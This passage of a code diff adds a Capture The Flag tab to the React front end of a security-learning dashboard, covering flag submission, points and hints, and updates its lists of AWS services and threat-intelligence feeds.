+                                                        <div className={`p-4 rounded-lg border ${forensicsResult.isCorrect
+                                                            ? 'bg-green-500/10 border-green-500/50 text-green-300'
+                                                            : 'bg-blue-500/10 border-blue-500/50 text-blue-300'
+                                                            }`}>
+                                                            <p className="font-semibold mb-2">
+                                                                {forensicsResult.isCorrect ? '✅ Correct!' : '💡 Explanation:'}
+                                                            </p>
+                                                            <p className="text-sm leading-relaxed">{forensicsResult.explanation}</p>
+                                                        </div>
+                                                    )}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    )}
+
+                                    {/* CTF Tab */}
+                                    {learningTab === 'ctf' && (
+                                        <div className="space-y-6">
+                                            <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 border border-purple-500/30 rounded-xl p-6 mb-6">
+                                                <h3 className="text-2xl font-bold mb-2">Capture The Flag Challenges</h3>
+                                                <p className="text-slate-400">
+                                                    Solve security puzzles to earn points. Submit flags in the format: <code className="px-2 py-1 bg-slate-800 rounded text-cyan-400">
+                                                        {"flag{...}"}
+                                                    </code>
+                                                </p>
+                                                <div className="mt-4 flex items-center gap-4">
+                                                    <div className="px-4 py-2 bg-purple-500/20 rounded-lg">
+                                                        <span className="text-purple-300 font-bold">
+                                                            {Object.values(ctfProgress).filter(p => p === 'completed').length}/{ctfChallenges.length} Completed
+                                                        </span>
+                                                    </div>
+                                                    <div className="px-4 py-2 bg-yellow-500/20 rounded-lg">
+                                                        <span className="text-yellow-300 font-bold">
+                                                            {ctfChallenges.filter(c => ctfProgress[c.id] === 'completed').reduce((sum, c) => sum + c.points, 0)} Points
+                                                        </span>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            {ctfChallenges.map(challenge => (
                                                 <div
-                                                    key={log.id}
-                                                    className={`p-2 rounded ${log.type === 'danger' ? 'bg-red-900/20 border-l-4 border-red-500' :
-                                                        log.type === 'warning' ? 'bg-yellow-900/20 border-l-4 border-yellow-500' :
-                                                            log.type === 'success' ? 'bg-green-900/20 border-l-4 border-green-500' :
-                                                                'bg-blue-900/20 border-l-4 border-blue-500'
+                                                    key={challenge.id}
+                                                    className={`bg-slate-900 border rounded-xl p-6 transition-all ${ctfProgress[challenge.id] === 'completed'
+                                                        ? 'border-green-500/50 bg-green-500/5'
+                                                        : 'border-slate-700'
                                                         }`}
                                                 >
-                                                    <div className="text-xs text-slate-400 mb-1">
-                                                        {new Date(log.timestamp).toLocaleTimeString()}
-                                                        {log.threatType && (
-                                                            <span className="ml-2 px-2 py-0.5 bg-slate-700 rounded text-xs">
-                                                                {log.threatType}
-                                                            </span>
-                                                        )}
+                                                    <div className="flex items-start justify-between mb-4">
+                                                        <div>
+                                                            <div className="flex items-center gap-3 mb-2">
+                                                                <h4 className="text-xl font-bold">{challenge.title}</h4>
+                                                                {ctfProgress[challenge.id] === 'completed' && (
+                                                                    <span className="px-2 py-1 bg-green-500/20 border border-green-500 rounded text-xs text-green-400 font-bold">
+                                                                        SOLVED ✓
+                                                                    </span>
+                                                                )}
+                                                            </div>
+                                                            <p className="text-slate-400">{challenge.description}</p>
+                                                        </div>
+                                                        <div className="text-right">
+                                                            <div className={`px-3 py-1 rounded-full text-xs font-bold mb-2 ${challenge.difficulty === 'Easy' ? 'bg-green-500/20 text-green-400' :
+                                                                challenge.difficulty === 'Medium' ? 'bg-yellow-500/20 text-yellow-400' :
+                                                                    'bg-red-500/20 text-red-400'
+                                                                }`}>
+                                                                {challenge.difficulty}
+                                                            </div>
+                                                            <div className="text-yellow-400 font-bold">{challenge.points} pts</div>
+                                                        </div>
                                                     </div>
-                                                    <div className="text-sm">{log.message}</div>
+
+                                                    <div className="bg-slate-950 border border-slate-700 rounded-lg p-4 mb-4 font-mono text-sm">
+                                                        <pre className="text-cyan-300 whitespace-pre-wrap">{challenge.challenge}</pre>
+                                                    </div>
+
+                                                    <div className="flex gap-3 mb-3">
+                                                        <input
+                                                            type="text"
+                                                            placeholder="Enter flag..."
+                                                            value={ctfFlags[challenge.id] || ''}
+                                                            onChange={(e) => setCtfFlags({ ...ctfFlags, [challenge.id]: e.target.value })}
+                                                            disabled={ctfProgress[challenge.id] === 'completed'}
+                                                            className="flex-1 px-4 py-2 bg-slate-950 border border-slate-700 rounded-lg text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 disabled:opacity-50 font-mono"
+                                                        />
+                                                        <button
+                                                            onClick={() => submitCTFFlag(challenge.id, ctfFlags[challenge.id])}
+                                                            disabled={ctfProgress[challenge.id] === 'completed'}
+                                                            className="px-6 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 rounded-lg font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+                                                        >
+                                                            Submit
+                                                        </button>
+                                                    </div>
+
+                                                    <details className="text-sm">
+                                                        <summary className="cursor-pointer text-yellow-400 hover:text-yellow-300">💡 Hint</summary>
+                                                        <p className="mt-2 text-slate-400 pl-4 border-l-2 border-yellow-500/30">{challenge.hint}</p>
+                                                    </details>
                                                 </div>
                                             ))}
                                         </div>
                                     )}
                                 </div>
-                                <div className="bg-blue-900/20 border border-blue-700 rounded-lg p-4">
-                                    <p className="text-sm text-blue-200">
-                                        <strong>💡 Tip:</strong> Monitor these simulations in your AWS Console:
-                                    </p>
-                                    <ul className="text-sm text-blue-300 mt-2 space-y-1 ml-4">
-                                        <li>• CloudWatch Logs for detailed event tracking</li>
-                                        <li>• GuardDuty for threat detection alerts</li>
-                                        <li>• CloudTrail for API call auditing</li>
-                                        <li>• WAF for web application firewall events</li>
-                                    </ul>
-                                </div>
-                            </div>
+                            )}
                         </div>
                     </div>
                 </div>
@@ -1709,6 +2383,9 @@ export default function App() {
                                     <span className="px-2 py-1 bg-orange-500/10 text-orange-400 rounded text-xs">S3</span>
                                     <span className="px-2 py-1 bg-orange-500/10 text-orange-400 rounded text-xs">Lambda</span>
                                     <span className="px-2 py-1 bg-orange-500/10 text-orange-400 rounded text-xs">API Gateway</span>
+                                    <span className="px-2 py-1 bg-orange-500/10 text-orange-400 rounded text-xs">Amplify</span>
+                                    <span className="px-2 py-1 bg-orange-500/10 text-orange-400 rounded text-xs">Route 53</span>
+
                                 </div>
                             </div>
 
@@ -1719,7 +2396,10 @@ export default function App() {
                                 <div className="flex flex-wrap gap-2">
                                     <span className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-xs">URLhaus</span>
                                     <span className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-xs">Feodo</span>
-                                    <span className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-xs">OTX</span>
+                                    <span className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-xs">AlienOTX</span>
+                                    <span className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-xs">VirusTotal</span>
+                                    <span className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-xs">NIST NVD</span>
+
                                 </div>
                             </div>
                         </div>
